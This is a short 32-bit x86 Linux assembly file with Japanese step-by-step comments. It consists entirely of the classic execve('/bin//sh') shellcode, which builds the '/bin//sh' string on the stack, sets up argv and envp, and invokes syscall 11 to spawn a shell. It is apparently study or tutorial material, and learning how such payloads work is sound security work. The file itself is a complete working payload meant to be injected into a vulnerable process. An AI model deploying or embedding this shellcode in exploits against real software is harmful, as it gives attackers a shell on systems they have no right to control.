BITS 32

; execve(const char *filename, char *const argv[], char *const envp[])
xor eax, eax
push eax        ; 文字列をNULLで終端
push 0x68732f2f ; //shをスタックにプッシュ
push 0x6e69622f ; /binをプッシュ
mov ebx, esp    ; 文字列へのアドレスをebxの収納
push eax
mov edx, esp    ; envp用の空の配列をedxに収納
push ebx
mov ecx, esp    ; argv用の配列をecxに収納
mov al, 11      ; システムコール番号をeaxに収納
int 0x80
